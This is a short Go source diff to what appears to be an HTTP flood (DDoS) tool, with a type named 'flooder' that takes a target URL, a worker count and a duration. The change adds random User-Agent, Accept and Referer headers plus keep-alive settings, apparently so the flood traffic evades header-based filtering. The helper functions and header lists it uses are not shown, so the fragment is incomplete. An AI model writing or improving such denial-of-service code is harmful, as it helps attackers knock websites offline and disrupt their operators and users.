@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"math/rand"
 	"net/http"
 	"os"
 	"runtime"
@@ -17,7 +18,10 @@ func NewFlooder(url string, workerAmount uint16, duration uint32) Flooder {
 	ddos := &flooder{
 		url: url,
 		header: []string{
-			"Accept:*/*",
+			"Connection: Keep-Alive, Cache-Control: max-age=0",
+			"User-Agent: " + getUserAgent(),
+			acceptall[rand.Intn(len(acceptall))],
+			referers[rand.Intn(len(referers))],
 		},
 		workerAmount: workerAmount,
 		client:       http.DefaultClient,
